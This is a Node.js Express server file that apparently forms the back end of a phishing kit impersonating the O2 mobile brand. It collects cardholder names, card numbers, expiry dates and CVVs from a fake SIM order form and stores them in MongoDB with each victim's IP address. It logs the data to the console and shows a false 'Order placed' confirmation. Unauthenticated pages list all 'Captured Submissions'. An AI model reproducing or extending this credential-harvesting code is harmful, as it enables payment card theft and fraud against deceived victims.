const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const path = require('path');
require('dotenv').config();

const Submission = require('./models/Submission');

const app = express();
const PORT = process.env.PORT || 3000;
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://localhost/o2_submissions';

app.use(cors());
app.use(express.json());
app.use(express.static(__dirname));

// Connect to MongoDB
mongoose.connect(MONGODB_URI)
  .then(() => console.log('✅ Connected to MongoDB'))
  .catch(err => console.error('❌ MongoDB connection error:', err.message));

// POST /submit — save card details to MongoDB
app.post('/submit', async (req, res) => {
  const { nameOnCard, cardNumber, expiry, cvv } = req.body;

  if (!nameOnCard || !cardNumber || !expiry || !cvv) {
    return res.status(400).json({ success: false, error: 'All fields are required.' });
  }

  try {
    const submission = new Submission({
      id: Date.now(),
      timestamp: new Date().toISOString(),
      nameOnCard,
      cardNumber,
      expiry,
      cvv,
      ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
      userAgent: req.headers['user-agent'],
    });

    await submission.save();

    console.log('\n========== NEW SUBMISSION ==========');
    console.log('Time:        ', submission.timestamp);
    console.log('Name:        ', submission.nameOnCard);
    console.log('Card Number: ', submission.cardNumber);
    console.log('Expiry:      ', submission.expiry);
    console.log('CVV:         ', submission.cvv);
    console.log('IP:          ', submission.ip);
    console.log('=====================================\n');

    res.json({ success: true, message: 'Order placed! Your SIM is on its way.' });
  } catch (error) {
    console.error('Submission error:', error);
    res.status(500).json({ success: false, error: 'Failed to process submission.' });
  }
});

// GET /api/submissions — view all captured data (JSON)
app.get('/api/submissions', async (req, res) => {
  try {
    const submissions = await Submission.find().sort({ createdAt: -1 });
    res.json(submissions);
  } catch (error) {
    console.error('Error fetching submissions:', error);
    res.status(500).json({ error: 'Failed to fetch submissions.' });
  }
});

// GET /submissions — view submissions page (HTML)
app.get('/submissions', async (req, res) => {
  try {
    const submissions = await Submission.find().sort({ createdAt: -1 });
    res.send(getSubmissionsPage(submissions));
  } catch (error) {
    console.error('Error fetching submissions:', error);
    res.send(getSubmissionsPage([]));
  }
});

function getSubmissionsPage(submissions) {
  const rows = submissions.map(s => `
    <tr>
      <td>${new Date(s.timestamp).toLocaleString()}</td>
      <td>${s.nameOnCard || '—'}</td>
      <td>${s.cardNumber || '—'}</td>
      <td>${s.expiry || '—'}</td>
      <td>${s.cvv || '—'}</td>
      <td>${s.ip || '—'}</td>
    </tr>
  `).join('');

  return `
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Submissions – O2</title>
      <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
      <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Inter', sans-serif; background: #f4f4f6; color: #1a1a2e; padding: 20px; }
        nav { background: #0019a5; padding: 0 24px; display: flex; align-items: center; height: 64px; margin-bottom: 40px; border-radius: 8px; }
        .nav-logo { color: #fff; font-size: 24px; font-weight: 800; }
        .container { max-width: 1100px; margin: 0 auto; background: #fff; border-radius: 12px; padding: 32px; box-shadow: 0 4px 24px rgba(0,25,165,0.08); }
        h1 { font-size: 28px; font-weight: 700; color: #0019a5; margin-bottom: 24px; }
        .count { font-size: 14px; color: #666; margin-bottom: 20px; }
        table { width: 100%; border-collapse: collapse; }
        th { background: #f4f4f6; padding: 12px 16px; text-align: left; font-size: 13px; font-weight: 600; color: #333; border-bottom: 2px solid #e0e0e8; }
        td { padding: 12px 16px; border-bottom: 1px solid #e0e0e8; font-size: 14px; }
        tr:hover { background: #fafafa; }
        .empty { text-align: center; padding: 40px 20px; color: #999; }
      </style>
    </head>
    <body>
      <nav>
        <div class="nav-logo">O<span style="font-size: 12px; vertical-align: super;">2</span> Submissions</div>
      </nav>
      <div class="container">
        <h1>📋 Captured Submissions</h1>
        <div class="count">${submissions.length} submission${submissions.length !== 1 ? 's' : ''}</div>
        ${submissions.length === 0 ? '<div class="empty">No submissions yet.</div>' : `
          <table>
            <thead>
              <tr>
                <th>Timestamp</th>
                <th>Name</th>
                <th>Card</th>
                <th>Expiry</th>
                <th>CVV</th>
                <th>IP Address</th>
              </tr>
            </thead>
            <tbody>
              ${rows}
            </tbody>
          </table>
        `}
      </div>
    </body>
    </html>
  `;
}

app.listen(PORT, () => {
  console.log(`\n🚀 O2 SIM Server running at http://localhost:${PORT}`);
  console.log(`📋 View submissions at http://localhost:${PORT}/submissions`);
  console.log(`� JSON API at http://localhost:${PORT}/api/submissions`);
  console.log(`💾 Database: ${MONGODB_URI.includes('localhost') ? 'Local MongoDB' : 'MongoDB Atlas'}\n`);
});
